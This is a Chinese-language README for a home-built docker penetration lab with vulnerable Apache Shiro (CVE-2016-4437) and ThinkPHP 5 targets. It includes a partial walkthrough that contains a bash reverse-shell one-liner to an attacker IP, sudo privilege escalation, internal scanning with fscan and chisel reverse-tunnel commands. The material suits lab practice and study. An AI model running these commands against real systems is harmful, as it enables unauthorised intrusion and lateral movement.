# xxx

这是对Puff-Pastry做的一个改进

改进：加入了提权，和任务权限维持



## 环境介绍

### web - shiro

本靶机漏洞编号为：CVE-2016-4437，即 Apache Shiro 1.2.4 反序列化漏洞

### web-thinkphp

本靶机漏洞为：ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞



## 安装

```sh
cd web-shiro
docker build -t hua/web-shiro .
```

```sh
cd web-thinkphp
docker build -t hua/web-thinkphp .
```





## 结构图

![image-20260311165913371](.\README.assets\image-20260311165913371.png)





发现是shiro，工具梭哈

![image-20260312091739767](.\README.assets\image-20260312091739767.png)



是个普通用户，先反弹shell，再提权

尝试是否存在，curl，wget命令

![image-20260312091842527](.\README.assets\image-20260312091842527.png)



shell命令

```sh
bash -i >& /dev/tcp/192.168.11.198/6666 0>&1
```



创建11.sh文件，下载到目标服务器

![image-20260312092332846](.\README.assets\image-20260312092332846.png)

![image-20260312092350845](.\README.assets\image-20260312092350845.png)



开启监听，执行11.sh

![image-20260312092558532](.\README.assets\image-20260312092558532.png)



提权

![image-20260312092845740](.\README.assets\image-20260312092845740.png)

无需密码，以任何用户（包括 root）身份运行 /bin/bash

![image-20260312092950593](.\README.assets\image-20260312092950593.png)



查看主机网络

![image-20260312093119621](.\README.assets\image-20260312093119621.png)



有个网卡，192.168.32.2 和 10.85.101.3

传fscan扫描

![image-20260312093918254](.\README.assets\image-20260312093918254.png)



扫描两个网段，发现这个网段下还有其他服务

![image-20260312094855160](.\README.assets\image-20260312094855160.png)



内网服务，使用chisel代理出来

监听

```powershell
chisel server -p 1331 --reverse
```

![image-20260312101225872](.\README.assets\image-20260312101225872.png)

传入chisel，执行

```sh
./chisel client 192.168.11.198:1331 R:0.0.0.0:10001:10.85.101.2:80
```

![image-20260312101312513](.\README.assets\image-20260312101312513.png)



浏览器访问

![image-20260312101410457](.\README.assets\image-20260312101410457.png)



thinkphp

![image-20260312101744441](.\README.assets\image-20260312101744441.png)



后续更新...

